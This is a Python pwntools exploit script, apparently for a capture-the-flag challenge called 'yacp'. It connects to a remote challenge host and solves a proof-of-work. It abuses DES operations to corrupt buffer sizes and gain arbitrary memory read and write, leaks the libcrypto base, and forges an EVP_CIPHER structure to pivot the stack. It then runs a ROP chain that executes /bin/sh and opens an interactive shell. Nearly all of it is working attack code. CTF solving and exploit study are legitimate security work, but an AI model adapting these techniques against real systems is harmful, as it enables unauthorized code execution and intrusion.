#!/usr/bin/python2

from pwn import *
from Crypto.Cipher import DES
import itertools
import hashlib
import sys

# 08 08 08 08 08 08 08 08 -> 08 50 00 00 3e 94 31 26
CIPHER = 'des-ecb'
CORRUPT_KEY = '\x0e\xac\x44\x3a\x41\x41\x41\x41'

# Safe buffers for auxiliary data: 12-21
NUM_BUFS = 32
BUF_SIZE = 2048
BUFFER_ADDR = 0x0804c0e0

def make_choice(n):
    p.recvuntil('5. Display data\n')
    p.sendline(str(n))

def load_data(buf, data):
    make_choice(0)
    p.sendline('{}\n{}\n{}'.format(len(data), buf, data.encode('hex')))
    p.recvuntil('hex-encoded bytes\n')

def read_data(buf):
    make_choice(5)
    p.sendline('{}'.format(buf))
    p.recvuntil(') = ')
    return p.recvline().strip().decode('hex')

CRYPTO_OP_ENCRYPT = 3
CRYPTO_OP_DECRYPT = 4
def crypto_op(op, dst_buf, src_buf, key=CORRUPT_KEY):
    KEY_BUF = 12
    load_data(KEY_BUF, key)
    make_choice(op)
    p.sendline('{}\n{}\n{}\n{}\n{}'.format(CIPHER, src_buf, dst_buf, KEY_BUF, KEY_BUF))
    p.recvuntil('For an IV (use any buffer if not needed) Which buffer (0-31) would you like to use?\n')

def load_data_contig(buf, data):
    chunks = [data[i:i+BUF_SIZE] for i in range(0, len(data), BUF_SIZE)]
    for i in range(len(chunks)):
        load_data(buf + i, chunks[i])

# If len(key) > 8, uses key[:8] for payload encryption
# but still loads the full key into the key buffer
def primitive_control_buf0(size, data='', key=CORRUPT_KEY):
    CORRUPT_SIZE = 20488
    # Load payload
    data += 'A'*(CORRUPT_SIZE - 8 - len(data)) + p32(size) + 'A'*4
    des = DES.new(key[:8], DES.MODE_ECB)
    load_data_contig(0, des.encrypt(data))
    # Corrupt buffer_size[0] = 20488
    crypto_op(CRYPTO_OP_ENCRYPT, NUM_BUFS - 1, 0)
    # Control size
    crypto_op(CRYPTO_OP_DECRYPT, NUM_BUFS - CORRUPT_SIZE / BUF_SIZE, 0, key)

# addr must be >= BUFFER_ADDR
def primitive_read(addr, n):
    off = addr - BUFFER_ADDR
    primitive_control_buf0(off + n)
    return read_data(0)[off:]

# addr must be >= BUFFER_ADDR + (NUM_BUFS-1)*BUF_SIZE
def primitive_write(addr, data, key=CORRUPT_KEY):
    off = addr - BUFFER_ADDR - (NUM_BUFS-1)*BUF_SIZE
    payload  = 'A'*off + data
    payload += 'A'*(8 - len(payload) % 8) if len(payload) % 8 != 0 else ''
    primitive_control_buf0(len(payload), payload, key)
    crypto_op(CRYPTO_OP_DECRYPT, NUM_BUFS - 1, 0, key)

def build_fake_evp_cipher(cleanup):
    # EVP_CIPHER.nid = 0x1d
    evp_cipher  = p32(0x1d)
    # EVP_CIPHER.block_size = 8
    evp_cipher += p32(8)
    # EVP_CIPHER.key_len = 8
    evp_cipher += p32(8)
    # EVP_CIPHER.iv_len = 0
    evp_cipher += p32(0)
    # EVP_CIPHER.flags = 0x201
    evp_cipher += p32(0x201)
    # EVP_CIPHER.init = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.do_cipher = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.cleanup = cleanup
    evp_cipher += p32(cleanup)
    # EVP_CIPHER.ctx_size = 0x84
    evp_cipher += p32(0x84)
    # EVP_CIPHER.set_asn1_parameters = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.get_asn1_parameters = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.ctrl = junk
    evp_cipher += p32(0xdeadbeef)
    # EVP_CIPHER.app_data = junk
    evp_cipher += p32(0xdeadbeef)
    return evp_cipher

def leak_libcrypto_base():
    EVP_CIPHER_PTR_ADDR = 0x805c208
    EVP_CIPHER_LIBCRYPTO_OFFSET = 0x1dd920
    evp_cipher_addr = u32(primitive_read(EVP_CIPHER_PTR_ADDR, 4))
    return evp_cipher_addr - EVP_CIPHER_LIBCRYPTO_OFFSET

def do_rop(rop, libcrypto_base):
    FAKE_EVP_CIPHER_BUF = 13
    FAKE_EVP_CIPHER_ADDR = BUFFER_ADDR + BUF_SIZE*FAKE_EVP_CIPHER_BUF
    GADGET_PIVOT = libcrypto_base + 0x3d619 # mov esp, ebp; pop ebp; ret;
    EVP_CIPHER_CTX_CIPHER_ADDR = 0x805c178
    # Load fake EVP_CIPHER in a buffer
    evp_cipher = build_fake_evp_cipher(GADGET_PIVOT)
    load_data(FAKE_EVP_CIPHER_BUF, evp_cipher)
    # Junk for EBP in front of ROP chain
    fake_stack = 'A'*4 + rop
    # When GADGET_PIVOT is executed ebp = key buffer
    # EVP_CIPHER_CTX.cipher = FAKE_EVP_CIPHER_ADDR
    primitive_write(EVP_CIPHER_CTX_CIPHER_ADDR, p32(FAKE_EVP_CIPHER_ADDR), fake_stack)

def do_challenge():
    p.recvuntil('It starts with ')
    prefix = p.recv(16)
    p.recvuntil('Magic word? ')
    alpha = [chr(i) for i in range(0x20, 0x7F + 1)]
    word = None
    for cand in itertools.product(alpha, repeat=16):
        cand_word = prefix + ''.join(cand)
        digest = hashlib.sha256(cand_word).digest()
        if digest[:3] == '\xff\xff\xff' and ord(digest[3]) >= 0xF0:
            word = cand_word
            break
    if word is None:
        print('[-] Cannot solve challenge')
        sys.exit(1)
    print('[+] Found magic word: {}'.format(word))
    p.sendline(word)

context(arch='i386', os='linux')
#p = process('./yacp', env={'LD_LIBRARY_PATH': '.'})
p = remote('yacp.chal.pwning.xxx', 7961)

print('[+] Solving challenge...')
do_challenge()

libcrypto_base = leak_libcrypto_base()
print('[+] Leaked libcrypto base: 0x{:08x}'.format(libcrypto_base))

rebase_0 = lambda x : p32(x + libcrypto_base)

rop  = rebase_0(0x000c9146) # 0x000c9146: pop eax; ret; 
rop += '//bi'
rop += rebase_0(0x00009328) # 0x00009328: pop edx; ret; 
rop += rebase_0(0x001e21a0)
rop += rebase_0(0x0011fdc8) # 0x0011fdc8: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x000c9146) # 0x000c9146: pop eax; ret; 
rop += 'n/sh'
rop += rebase_0(0x00009328) # 0x00009328: pop edx; ret; 
rop += rebase_0(0x001e21a4)
rop += rebase_0(0x0011fdc8) # 0x0011fdc8: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x000c9146) # 0x000c9146: pop eax; ret; 
rop += p32(0x00000000)
rop += rebase_0(0x00009328) # 0x00009328: pop edx; ret; 
rop += rebase_0(0x001e21a8)
rop += rebase_0(0x0011fdc8) # 0x0011fdc8: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x0000641e) # 0x0000641e: pop ebx; ret; 
rop += rebase_0(0x001e21a0)
rop += rebase_0(0x00004c32) # 0x00004c32: pop ecx; ret; 
rop += rebase_0(0x001e21a8)
rop += rebase_0(0x00009328) # 0x00009328: pop edx; ret; 
rop += rebase_0(0x001e21a8)
rop += rebase_0(0x000c9146) # 0x000c9146: pop eax; ret; 
rop += p32(0x0000000b)
rop += rebase_0(0x0014d146) # 0x0014d146: int 0x80;

do_rop(rop, libcrypto_base)

p.interactive()